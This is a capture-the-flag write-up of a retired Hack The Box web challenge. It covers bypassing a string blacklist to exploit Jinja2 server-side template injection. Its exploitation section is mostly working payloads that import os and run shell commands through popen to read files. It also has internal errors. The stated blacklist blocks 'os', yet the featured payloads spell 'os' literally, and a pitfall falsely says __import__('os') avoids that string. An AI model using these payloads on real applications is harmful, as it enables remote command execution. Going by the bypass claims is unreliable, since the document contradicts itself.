---
challenge: baby ninja jinja
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, jinja2, ssti, blacklist-bypass]
---

# baby ninja jinja — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

The same Jinja2 SSTI ground, but with a **blacklist** blocking `{{ }}`, `_`, `.` and words such as `os` or `config`. Get out with `{% print %}` to avoid double braces, the `attr` filter in place of dots, and `request.application` to reach globals without writing `__globals__` literally.

## Brief

A search box that reflects what you type. `{{7*7}}` returns an error or the raw text: there is a filter. The challenge name already names the technology.

## Analysis

The app does roughly:

```python
blacklist = ["{{", "}}", "_", ".", "os", "config", "class", "mro"]
if any(b in name for b in blacklist):
    return "no"
return render_template_string(name)
```

Since `{% %}` is not blocked, the print statement remains; and since `attr` is a Jinja2 filter, it replaces dot access.

## Exploitation

```text
{%print(7*7)%}
```

Confirms execution. To reach `os` without writing `_`, `.` or `os`:

```text
{%print(request|attr('application')|attr('~globals~'|replace('~','_'))|attr('~builtins~'|replace('~','_'))|attr('~import~'|replace('~','_'))('os')|attr('popen')('cat /flag*')|attr('read')())%}
```

Shorter when only `{{`/`}}` are filtered:

```text
{%print(request.application.__globals__.__builtins__.__import__('os').popen('cat /flag*').read())%}
```

Alternative with `cycler`, rarely on the list:

```text
{%print(cycler|attr('~init~'|replace('~','_'))|attr('~globals~'|replace('~','_'))|attr('os')|attr('popen')('cat /flag*')|attr('read')())%}
```

```text
HTB{<flag>}
```

## Pitfalls

- **`print` parentheses**: `{%print x%}` works without them in Jinja2; with them it also works in most versions.
- **Quotes and `_`**: `replace('~','_')` rebuilds the attribute name without writing it.
- **`os` blocked**: importing through `__import__('os')` avoids the literal string.

## Lessons

- String blacklists are bypassed with filters and concatenation; SSTI closes with a sandbox, not with denylists.
- `{% %}` and `attr` are the first two things to try when `{{ }}` and `.` are filtered.
- Mitigation: `SandboxedEnvironment`, variables instead of dynamic templates, and a WAF as an extra layer.
